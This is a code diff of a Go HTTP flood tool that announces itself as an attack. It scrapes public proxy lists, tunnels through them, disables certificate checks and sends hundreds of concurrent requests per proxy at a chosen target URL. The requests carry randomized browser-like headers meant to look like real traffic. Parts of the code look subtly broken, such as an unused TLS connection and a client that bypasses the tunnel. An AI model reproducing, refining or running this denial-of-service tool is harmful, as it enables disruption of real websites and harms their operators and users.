@@ -1,5 +1,5 @@
 package main
-// 29
+
 import (
     "crypto/tls"
     "flag"
@@ -15,27 +15,58 @@ import (
     "sync"
     "sync/atomic"
     "time"
+
+    "golang.org/x/net/http2"
 )
 
 var (
-    targetURL   string
-    duration    int
-    threads     int
-    proxies     []string
-    clientPool  sync.Pool
+    targetURL    string
+    duration     int
+    threads      int
+    proxies      []string
     requestCount uint64
-    peakRPS     uint64
-    acceptList  = []string{
+    peakRPS      uint64
+
+    // Accept and User-Agent lists
+    acceptList = []string{
         "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
         "application/json, text/javascript, */*; q=0.01",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "application/javascript, */*;q=0.8",
+        "application/x-www-form-urlencoded;q=0.9,image/webp,image/apng,*/*;q=0.8",
     }
-    userAgents = []string{
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+
+    userAgentList = []string{
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.3945.88 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.102 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.66 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3945.79 Mobile Safari/537.36",
     }
+
+    // Paths list
+    paths = []string{"/", "/home", "/login", "/dashboard", "/api/data", "/status"}
+
     proxySources = []string{
         "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=20000",
         "https://proxyelite.info/wp-admin/admin-ajax.php?action=proxylister_download&nonce=afb07d3ca5&format=txt",
+    }
+
+    clientPool = sync.Pool{
+        New: func() interface{} {
+            transport := &http2.Transport{
+                TLSClientConfig: createTLSConfig(),
+                DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
+                    return tls.Dial(network, addr, cfg)
+                },
+            }
+            return &http.Client{
+                Transport: transport,
+                Timeout:   500 * time.Millisecond,
+            }
+        },
     }
 )
 
@@ -49,32 +80,29 @@ func init() {
         fmt.Println("Usage: go run main.go -url [target] -time [seconds] -threads [count]")
         os.Exit(1)
     }
-
-    // Initialize client pool
-    clientPool.New = func() interface{} {
-        return &http.Client{
-            Transport: &http.Transport{
-                TLSClientConfig: &tls.Config{
-                    MinVersion:         tls.VersionTLS13,
-                    MaxVersion:         tls.VersionTLS13,
-                    CipherSuites:       []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384},
-                    CurvePreferences:   []tls.CurveID{tls.X25519},
-                    InsecureSkipVerify: true,
-                },
-                MaxIdleConns:        10000,
-                MaxIdleConnsPerHost: 1000,
-                IdleConnTimeout:     90 * time.Second,
-                DialContext: (&net.Dialer{
-                    Timeout:   5 * time.Second,
-                    KeepAlive: 30 * time.Second,
-                }).DialContext,
-            },
-            Timeout: 5 * time.Second,
-        }
-    }
-
-    // Fetch proxies
     fetchProxies()
+}
+
+// Random functions
+func getRandomInt(min, max int) int { return rand.Intn(max-min+1) + min }
+func randomMethod() string {
+    if rand.Float32() < 0.5 {
+        return "GET"
+    }
+    return "POST"
+}
+func randomPath() string { return paths[rand.Intn(len(paths))] }
+
+// Create TLS config
+func createTLSConfig() *tls.Config {
+    return &tls.Config{
+        CipherSuites:       []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384},
+        MinVersion:         tls.VersionTLS13,
+        MaxVersion:         tls.VersionTLS13,
+        InsecureSkipVerify: true,
+        NextProtos:         []string{"h2"},
+        CurvePreferences:   []tls.CurveID{tls.X25519},
+    }
 }
 
 func fetchProxies() {
@@ -112,20 +140,78 @@ func fetchProxies() {
     fmt.Printf("Loaded %d proxies\n", len(proxies))
 }
 
-func randomString(slice []string) string {
-    return slice[rand.Intn(len(slice))]
-}
+func sendRequest(proxyAddr, target string) {
+    parsedURL, err := url.Parse(target)
+    if err != nil {
+        log.Println("Invalid target URL:", err)
+        return
+    }
 
-func randomPath() string {
-    paths := []string{"/", "/home", "/api", "/data"}
-    return paths[rand.Intn(len(paths))]
+    dialer := &net.Dialer{Timeout: 3 * time.Second, KeepAlive: 30 * time.Second}
+    conn, err := dialer.Dial("tcp", proxyAddr)
+    if err != nil {
+        return
+    }
+    defer conn.Close()
+
+    // CONNECT request
+    fmt.Fprintf(conn, "CONNECT %s:443 HTTP/1.1\r\nHost: %s\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n", parsedURL.Host, parsedURL.Host)
+    buf := make([]byte, 4096)
+    _, err = conn.Read(buf)
+    if err != nil || !strings.Contains(string(buf), "200") {
+        return
+    }
+
+    // TLS wrapping
+    tlsConn := tls.Client(conn, createTLSConfig())
+    rawConn, _ := conn.(*net.TCPConn)
+    rawConn.SetKeepAlive(true)
+    rawConn.SetKeepAlivePeriod(30 * time.Second)
+
+    client := clientPool.Get().(*http.Client)
+    defer clientPool.Put(client)
+
+    // Send requests in parallel
+    var wg sync.WaitGroup
+    for i := 0; i < 500; i++ {
+        wg.Add(1)
+        go func() {
+            defer wg.Done()
+            headers := map[string]string{
+                "sec-purpose":               "prefetch;prerender",
+                "purpose":                   "prefetch",
+                "sec-ch-ua":                 fmt.Sprintf("\"Not_A Brand\";v=\"%d\", \"Chromium\";v=\"%d\", \"Google Chrome\";v=\"%d\"", getRandomInt(121, 345), getRandomInt(421, 6345), getRandomInt(421, 7124356)),
+                "sec-ch-ua-mobile":          "?0",
+                "sec-ch-ua-platform":        map[bool]string{true: "Windows", false: "MacOS"}[rand.Float32() < 0.5],
+                "upgrade-insecure-requests": "1",
+                "accept":                    acceptList[rand.Intn(len(acceptList))],
+                "accept-encoding":           "gzip, deflate, br",
+                "accept-language":           "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7",
+                "referer":                   "https://" + parsedURL.Host + randomPath(),
+                "user-agent":                userAgentList[rand.Intn(len(userAgentList))],
+            }
+
+            method := randomMethod()
+            path := randomPath()
+            req, err := http.NewRequest(method, target+path, nil)
+            if err != nil {
+                return
+            }
+            for k, v := range headers {
+                req.Header.Set(k, v)
+            }
+            atomic.AddUint64(&requestCount, 1)
+            resp, err := client.Do(req)
+            if err == nil {
+                resp.Body.Close()
+            }
+        }()
+    }
+    wg.Wait()
 }
 
 func attack(wg *sync.WaitGroup, stopChan chan struct{}) {
     defer wg.Done()
-    
-    client := clientPool.Get().(*http.Client)
-    defer clientPool.Put(client)
 
     for {
         select {
@@ -133,22 +219,7 @@ func attack(wg *sync.WaitGroup, stopChan chan struct{}) {
             return
         default:
             proxy := proxies[rand.Intn(len(proxies))]
-            proxyURL, _ := url.Parse("http://" + proxy)
-            client.Transport.(*http.Transport).Proxy = http.ProxyURL(proxyURL)
-
-            req, _ := http.NewRequest(
-                "GET",
-                targetURL+randomPath(),
-                nil,
-            )
-
-            req.Header.Set("Accept", randomString(acceptList))
-            req.Header.Set("User-Agent", randomString(userAgents))
-            req.Header.Set("Accept-Encoding", "gzip, deflate, br")
-            req.Header.Set("Connection", "keep-alive")
-
-            atomic.AddUint64(&requestCount, 1)
-            go client.Do(req)
+            sendRequest(proxy, targetURL)
             time.Sleep(time.Microsecond * 10)
         }
     }
@@ -182,21 +253,17 @@ func main() {
 
     fmt.Printf("Starting attack on %s with %d threads for %d seconds\n", targetURL, threads, duration)
 
-    // Start stats monitoring
     go monitorStats(stopChan)
 
-    // Start attack threads
     for i := 0; i < threads; i++ {
         wg.Add(1)
         go attack(&wg, stopChan)
     }
 
-    // Wait for duration
     time.Sleep(time.Duration(duration) * time.Second)
     close(stopChan)
     wg.Wait()
 
-    // Calculate and display statistics
     total := atomic.LoadUint64(&requestCount)
     avgRPS := float64(total) / float64(duration)
     peak := atomic.LoadUint64(&peakRPS)
